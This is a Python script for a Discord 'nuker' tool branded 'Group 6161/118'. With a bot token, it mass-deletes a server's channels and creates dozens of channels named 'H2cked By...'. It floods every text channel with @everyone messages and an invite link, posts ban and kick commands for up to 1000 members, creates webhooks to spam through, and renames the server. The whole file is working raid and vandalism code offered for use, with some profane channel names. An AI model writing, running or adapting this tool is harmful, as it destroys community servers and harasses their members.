import requests
import threading
import time
from colorama import Fore, Style, init
import os
import random

init(autoreset=True)

TOKEN = input(Fore.WHITE + "Enter Bot Token: " + Fore.LIGHTYELLOW_EX)
HEADERS = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}

delete_counter = 0
create_counter = 0
message_counter = 0
ban_counter = 0
kick_counter = 0
webhook_counter = 0
lock = threading.Lock()

CHANNEL_NAMES = [
    "H2cked By Group 6161", "H2cked By Raiso", "Fucked By Raisk",
    "H2cked By Raiso", "Ha2cked By Raiso", "Fucked By Raisk",
    "H2cked By Blood lovers", "Raiso Is Here", "Group 6161", "6161",
    "Ha2cked By 6161", "Fucked By Raiso", "Fucked By Raiso"
]

RANDOM_MESSAGES = [
    "Ha2cked By Group 6161", "Raiso Is Here", "6161 Was Here",
    "Fucked By 6161", "Group 6161 On Top", "H2cked By Raiso",
    "Raiso", "Raiso > ALL", "Fucked By Raiso"
]

LOGO = f"""{Fore.RED}

                                                                                                               
666666666666666      1111111       666666666666666      1111111
  6::::::::::::::6    1::::::1       6::::::::::::::6    1::::::1
  6::::::::::::::6   1:::::::1       6::::::::::::::6   1:::::::1
  6::::::66666::::6   111:::::1       6::::::66666::::6   111:::::1
  6:::::6     6::::6      1::::1      6:::::6     6::::6      1::::1
  6:::::6            1::::1      6:::::6            1::::1
  6:::::6            1::::1      6:::::6            1::::1
  6:::::66666        1::::1      6:::::66666        1::::1
  6::::::::::::6     1::::1      6::::::::::::6     1::::1
  6::::::::::::6     1::::1      6::::::::::::6     1::::1
  6:::::66666        1::::1      6:::::66666        1::::1
  6:::::6            1::::1      6:::::6            1::::1
  6:::::6     6::::6      1::::1      6:::::6     6::::6      1::::1
  6::::::66666::::6  111::::::111  6::::::66666::::6  111::::::111
  6::::::::::::::6  1::::::::::1  6::::::::::::::6  1::::::::::1
  666666666666666   1::::::::::1   666666666666666   1::::::::::1
                      111111111111                     111111111111             
                               
{Fore.WHITE}                  Are you {Fore.RED}ready for more problems{Fore.WHITE} ??
{Fore.RED}     ═════════════════════════════════════════════════════════════
"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def fast_request(method, url, **kwargs):
    try:
        return requests.request(method, url, headers=HEADERS, **kwargs, timeout=3)
    except:
        return None

def get_guilds():
    clear_screen()
    print(LOGO)
    print(Fore.WHITE + "\n" + Fore.RED + "Fetching Servers" + Fore.WHITE + "\n")
    try:
        response = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=HEADERS, timeout=5)
        if response.status_code == 200:
            guilds = response.json()
            if not guilds:
                print(Fore.RED + "No Servers Found")
                time.sleep(2)
                return None
            for idx, guild in enumerate(guilds, 1):
                print(Fore.RED + f"[{idx}] " + Fore.WHITE + f"{guild['name']} " + Fore.RED + f"| ID: {guild['id']}")
            choice = input(Fore.WHITE + "\nSelect Server Number: " + Fore.LIGHTYELLOW_EX)
            try:
                selected = guilds[int(choice) - 1]
                return selected['id']
            except:
                print(Fore.RED + "\nInvalid Selection")
                time.sleep(2)
                return None
        else:
            print(Fore.RED + "Failed to Fetch Servers")
            time.sleep(2)
            return None
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
        time.sleep(2)
        return None

def delete_channel_thread(guild_id, channel_id, channel_name):
    global delete_counter
    response = fast_request("DELETE", f"https://discord.com/api/v10/channels/{channel_id}")
    if response and response.status_code in [200, 204]:
        with lock:
            delete_counter += 1
            print(Fore.WHITE + f"Deleted Channel " + Fore.RED + f"#{delete_counter} " + Fore.WHITE + f"> " + Fore.RED + f"{channel_name}")
    time.sleep(0.02)

def delete_all_channels(guild_id):
    global delete_counter
    delete_counter = 0
    print(Fore.WHITE + "\n" + Fore.RED + "Deleting All Channels" + Fore.WHITE + "")
    try:
        while True:
            response = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=HEADERS, timeout=5)
            if response.status_code == 200:
                channels = response.json()
                if not channels:
                    break
                threads = []
                for channel in channels:
                    if isinstance(channel, dict) and 'id' in channel:
                        t = threading.Thread(target=delete_channel_thread, args=(guild_id, channel['id'], channel.get('name', 'Unknown')))
                        threads.append(t)
                        t.start()
                        time.sleep(0.01)
                for t in threads:
                    t.join()
                time.sleep(0.5)
            else:
                break
        print(Fore.GREEN + f"\nSuccessfully Deleted {delete_counter} Channels")
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    input(Fore.WHITE + "\nPress Enter to continue...")

def create_channel_thread(guild_id, channel_name):
    global create_counter
    response = fast_request("POST", f"https://discord.com/api/v10/guilds/{guild_id}/channels", json={"name": channel_name, "type": 0})
    if response and response.status_code in [200, 201]:
        with lock:
            create_counter += 1
            print(Fore.WHITE + f"Created Channel " + Fore.RED + f"#{create_counter} " + Fore.WHITE + f"> " + Fore.RED + f"{channel_name}")
    time.sleep(0.05)

def create_spam_channels(guild_id):
    global create_counter
    create_counter = 0
    print(Fore.WHITE + "\n" + Fore.RED + "Creating Spam Channels" + Fore.WHITE + "")
    try:
        threads = []
        for i in range(50):
            channel_name = random.choice(CHANNEL_NAMES)
            t = threading.Thread(target=create_channel_thread, args=(guild_id, channel_name))
            threads.append(t)
            t.start()
            time.sleep(0.01)
        for t in threads:
            t.join()
        print(Fore.GREEN + f"\nSuccessfully Created {create_counter} Channels")
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    input(Fore.WHITE + "\nPress Enter to continue...")

def send_message_thread(channel_id, channel_name, msg):
    global message_counter
    response = fast_request("POST", f"https://discord.com/api/v10/channels/{channel_id}/messages", json={"content": msg})
    if response and response.status_code in [200, 201]:
        with lock:
            message_counter += 1
            print(Fore.WHITE + f"Sent Message " + Fore.RED + f"#{message_counter} " + Fore.WHITE + f"> Channel: " + Fore.RED + f"{channel_name}")
    time.sleep(0.1)

def send_to_all_channels(guild_id):
    global message_counter
    message_counter = 0
    print(Fore.WHITE + "\n" + Fore.RED + "Sending Messages To All Channels" + Fore.WHITE + "")
    msg = "@everyone @here\n\nHa2cked By Group 118\nhttps://discord.gg/hgqVFk6D6y"
    try:
        response = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=HEADERS, timeout=5)
        if response.status_code == 200:
            channels = response.json()
            text_channels = [ch for ch in channels if isinstance(ch, dict) and ch.get('type') == 0]
            if not text_channels:
                print(Fore.RED + "No Text Channels Found")
                input(Fore.WHITE + "\nPress Enter to continue...")
                return
            threads = []
            for channel in text_channels:
                for _ in range(3):
                    t = threading.Thread(target=send_message_thread, args=(channel['id'], channel.get('name', 'Unknown'), msg))
                    threads.append(t)
                    t.start()
                    time.sleep(0.01)
            for t in threads:
                t.join()
            print(Fore.GREEN + f"\nSuccessfully Sent {message_counter} Messages")
        else:
            print(Fore.RED + "Failed to Fetch Channels")
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    input(Fore.WHITE + "\nPress Enter to continue...")

def get_first_text_channel(guild_id):
    try:
        response = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=HEADERS, timeout=5)
        if response.status_code == 200:
            channels = response.json()
            text_channels = [ch for ch in channels if isinstance(ch, dict) and ch.get('type') == 0]
            if text_channels:
                return text_channels[0]['id'], text_channels[0].get('name', 'Unknown')
        return None, None
    except:
        return None, None

def send_ban_command(guild_id):
    global ban_counter
    ban_counter = 0
    print(Fore.WHITE + "\n" + Fore.RED + "Sending Ban Commands" + Fore.WHITE + "")
    try:
        channel_id, channel_name = get_first_text_channel(guild_id)
        if not channel_id:
            print(Fore.RED + "No Text Channel Found")
            input(Fore.WHITE + "\nPress Enter to continue...")
            return
        response = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=HEADERS, timeout=5)
        if response.status_code == 200:
            members = response.json()
            if not members:
                print(Fore.RED + "No Members Found")
                input(Fore.WHITE + "\nPress Enter to continue...")
                return
            print(Fore.GREEN + f"Found Channel: {channel_name}")
            print(Fore.GREEN + f"Sending ban commands for {len(members)} members...\n")
            for member in members:
                if isinstance(member, dict) and 'user' in member and isinstance(member['user'], dict) and 'id' in member['user']:
                    user_id = member['user']['id']
                    username = member['user'].get('username', 'Unknown')
                    ban_msg = f"!ban <@{user_id}> Banned by Group 118"
                    try:
                        msg_response = fast_request("POST", f"https://discord.com/api/v10/channels/{channel_id}/messages", json={"content": ban_msg})
                        if msg_response and msg_response.status_code in [200, 201]:
                            ban_counter += 1
                            print(Fore.WHITE + f"Sent Ban Command " + Fore.RED + f"#{ban_counter} " + Fore.WHITE + f"> User: " + Fore.RED + f"{username} " + Fore.WHITE + f"| ID: " + Fore.RED + f"{user_id}")
                        time.sleep(0.5)
                    except:
                        pass
            print(Fore.GREEN + f"\nSuccessfully Sent {ban_counter} Ban Commands")
        else:
            print(Fore.RED + "Failed to Fetch Members")
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    input(Fore.WHITE + "\nPress Enter to continue...")

def send_kick_command(guild_id):
    global kick_counter
    kick_counter = 0
    print(Fore.WHITE + "\n" + Fore.RED + "Sending Kick Commands" + Fore.WHITE + "")
    try:
        channel_id, channel_name = get_first_text_channel(guild_id)
        if not channel_id:
            print(Fore.RED + "No Text Channel Found")
            input(Fore.WHITE + "\nPress Enter to continue...")
            return
        response = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=HEADERS, timeout=5)
        if response.status_code == 200:
            members = response.json()
            if not members:
                print(Fore.RED + "No Members Found")
                input(Fore.WHITE + "\nPress Enter to continue...")
                return
            print(Fore.GREEN + f"Found Channel: {channel_name}")
            print(Fore.GREEN + f"Sending kick commands for {len(members)} members...\n")
            for member in members:
                if isinstance(member, dict) and 'user' in member and isinstance(member['user'], dict) and 'id' in member['user']:
                    user_id = member['user']['id']
                    username = member['user'].get('username', 'Unknown')
                    kick_msg = f"!kick <@{user_id}> Kicked by Group 118"
                    try:
                        msg_response = fast_request("POST", f"https://discord.com/api/v10/channels/{channel_id}/messages", json={"content": kick_msg})
                        if msg_response and msg_response.status_code in [200, 201]:
                            kick_counter += 1
                            print(Fore.WHITE + f"Sent Kick Command " + Fore.RED + f"#{kick_counter} " + Fore.WHITE + f"> User: " + Fore.RED + f"{username} " + Fore.WHITE + f"| ID: " + Fore.RED + f"{user_id}")
                        time.sleep(0.5)
                    except:
                        pass
            print(Fore.GREEN + f"\nSuccessfully Sent {kick_counter} Kick Commands")
        else:
            print(Fore.RED + "Failed to Fetch Members")
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    input(Fore.WHITE + "\nPress Enter to continue...")

def create_webhook_thread(channel_id, channel_name):
    global webhook_counter
    try:
        webhook_check = requests.get(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=HEADERS, timeout=5)
        if webhook_check.status_code == 200:
            existing_webhooks = webhook_check.json()
            for webhook in existing_webhooks:
                if webhook.get('name') == '139':
                    with lock:
                        webhook_counter += 1
                        print(Fore.WHITE + f"Webhook Already Exists " + Fore.RED + f"#{webhook_counter} " + Fore.WHITE + f"> Channel: " + Fore.RED + f"{channel_name}")
                    return
        response = requests.post(
            f"https://discord.com/api/v10/channels/{channel_id}/webhooks",
            headers=HEADERS,
            json={"name": "139"},
            timeout=5
        )
        if response.status_code in [200, 201]:
            with lock:
                webhook_counter += 1
                print(Fore.WHITE + f"Created Webhook " + Fore.RED + f"#{webhook_counter} " + Fore.WHITE + f"> Channel: " + Fore.RED + f"{channel_name}")
        time.sleep(0.5)
    except Exception as e:
        pass

def create_webhooks(guild_id):
    global webhook_counter
    webhook_counter = 0
    print(Fore.WHITE + "\n" + Fore.RED + "Creating Webhooks" + Fore.WHITE + "")
    try:
        response = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=HEADERS, timeout=5)
        if response.status_code == 200:
            channels = response.json()
            text_channels = [ch for ch in channels if isinstance(ch, dict) and ch.get('type') == 0]
            if not text_channels:
                print(Fore.RED + "No Text Channels Found")
                input(Fore.WHITE + "\nPress Enter to continue...")
                return
            print(Fore.GREEN + f"Found {len(text_channels)} text channels\n")
            threads = []
            for channel in text_channels:
                t = threading.Thread(target=create_webhook_thread, args=(channel['id'], channel.get('name', 'Unknown')))
                threads.append(t)
                t.start()
                time.sleep(0.3)
            for t in threads:
                t.join()
            print(Fore.GREEN + f"\nSuccessfully Processed {webhook_counter} Webhooks")
        else:
            print(Fore.RED + "Failed to Fetch Channels")
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    input(Fore.WHITE + "\nPress Enter to continue...")

def send_webhook_spam_thread(webhook_url, channel_name, count):
    global message_counter
    for _ in range(count):
        try:
            msg = random.choice(RANDOM_MESSAGES)
            response = requests.post(
                webhook_url,
                json={"content": msg, "username": "118"},
                timeout=3
            )
            if response.status_code in [200, 204]:
                with lock:
                    message_counter += 1
                    print(Fore.WHITE + f"Sent Webhook Message " + Fore.RED + f"#{message_counter} " + Fore.WHITE + f"> Channel: " + Fore.RED + f"{channel_name}")
            time.sleep(0.3)
        except:
            pass

def send_webhook_messages(guild_id):
    global message_counter
    message_counter = 0
    print(Fore.WHITE + "\n" + Fore.RED + "Sending Webhook Messages" + Fore.WHITE + "")
    try:
        response = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=HEADERS, timeout=5)
        if response.status_code == 200:
            channels = response.json()
            text_channels = [ch for ch in channels if isinstance(ch, dict) and ch.get('type') == 0]
            if not text_channels:
                print(Fore.RED + "No Text Channels Found")
                input(Fore.WHITE + "\nPress Enter to continue...")
                return
            print(Fore.GREEN + f"Found {len(text_channels)} text channels\n")
            threads = []
            for channel in text_channels:
                channel_id = channel['id']
                channel_name = channel.get('name', 'Unknown')
                webhook_response = requests.get(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=HEADERS, timeout=5)
                webhook_url = None
                if webhook_response.status_code == 200:
                    webhooks = webhook_response.json()
                    for webhook in webhooks:
                        if webhook.get('name') == '139':
                            webhook_url = f"https://discord.com/api/v10/webhooks/{webhook['id']}/{webhook['token']}"
                            break
                if not webhook_url:
                    create_response = requests.post(
                        f"https://discord.com/api/v10/channels/{channel_id}/webhooks",
                        headers=HEADERS,
                        json={"name": "139"},
                        timeout=5
                    )
                    if create_response.status_code in [200, 201]:
                        webhook_data = create_response.json()
                        webhook_url = f"https://discord.com/api/v10/webhooks/{webhook_data['id']}/{webhook_data['token']}"
                        time.sleep(0.5)
                if webhook_url:
                    t = threading.Thread(target=send_webhook_spam_thread, args=(webhook_url, channel_name, 5))
                    threads.append(t)
                    t.start()
                    time.sleep(0.2)
            for t in threads:
                t.join()
            print(Fore.GREEN + f"\nSuccessfully Sent {message_counter} Webhook Messages")
        else:
            print(Fore.RED + "Failed to Fetch Channels")
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    input(Fore.WHITE + "\nPress Enter to continue...")

def change_server_name(guild_id):
    print(Fore.WHITE + "\n" + Fore.RED + "Changing Server Name" + Fore.WHITE + "")
    new_name = "H2cked By Group 118"
    try:
        response = fast_request("PATCH", f"https://discord.com/api/v10/guilds/{guild_id}", json={"name": new_name})
        if response and response.status_code == 200:
            print(Fore.GREEN + "Server Name Changed to: " + Fore.RED + f"{new_name}")
        else:
            print(Fore.RED + "Failed to Change Server Name")
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    input(Fore.WHITE + "\nPress Enter to continue...")

def menu(guild_id):
    while True:
        clear_screen()
        print(LOGO)
        print(Fore.RED + "               [" + Fore.WHITE + "1" + Fore.RED + "] " + Fore.WHITE + "Delete Channels          " + Fore.RED + "[" + Fore.WHITE + "5" + Fore.RED + "] " + Fore.WHITE + "Send Kick Commands")
        print(Fore.RED + "               [" + Fore.WHITE + "2" + Fore.RED + "] " + Fore.WHITE + "Create Channels          " + Fore.RED + "[" + Fore.WHITE + "6" + Fore.RED + "] " + Fore.WHITE + "Create Webhooks")
        print(Fore.RED + "               [" + Fore.WHITE + "3" + Fore.RED + "] " + Fore.WHITE + "Send To All Channels     " + Fore.RED + "[" + Fore.WHITE + "7" + Fore.RED + "] " + Fore.WHITE + "Send Webhook Messages")
        print(Fore.RED + "               [" + Fore.WHITE + "4" + Fore.RED + "] " + Fore.WHITE + "Send Ban Commands        " + Fore.RED + "[" + Fore.WHITE + "8" + Fore.RED + "] " + Fore.WHITE + "Change Server Name")
        print(Fore.RED + "               [" + Fore.WHITE + "0" + Fore.RED + "] " + Fore.WHITE + "Exit Tool")
        print(Fore.RED + "\n               ═════════════════════════════════════════════════════════════")
        try:
            choice = input(
                Fore.RED + "  [" + Fore.WHITE + "D2nte" + Fore.RED + "]-" +
                "[" + Fore.WHITE + "ROOT" + Fore.RED + "]\n" +
                Fore.RED + "  >> " + Fore.WHITE + ""
            ).strip()
            
            if choice == "1":
                delete_all_channels(guild_id)
            elif choice == "2":
                create_spam_channels(guild_id)
            elif choice == "3":
                send_to_all_channels(guild_id)
            elif choice == "4":
                send_ban_command(guild_id)
            elif choice == "5":
                send_kick_command(guild_id)
            elif choice == "6":
                create_webhooks(guild_id)
            elif choice == "7":
                send_webhook_messages(guild_id)
            elif choice == "8":
                change_server_name(guild_id)
            elif choice == "0":
                print(Fore.GREEN + "\nThanks for using Group 118 Tool")
                print(Fore.WHITE + "Goodbye!\n")
                time.sleep(1)
                break
            else:
                print(Fore.RED + "\nInvalid Choice")
                time.sleep(1)
        except KeyboardInterrupt:
            print(Fore.RED + "\n\nProgram Interrupted by User\n")
            break
        except Exception as e:
            print(Fore.RED + f"\nError: {str(e)}\n")
            time.sleep(2)

if __name__ == "__main__":
    try:
        guild_id = get_guilds()
        if guild_id:
            menu(guild_id)
    except KeyboardInterrupt:
        print(Fore.RED + "\n\nProgram Terminated\n")
    except Exception as e:
        print(Fore.RED + f"\nFatal Error: {str(e)}\n")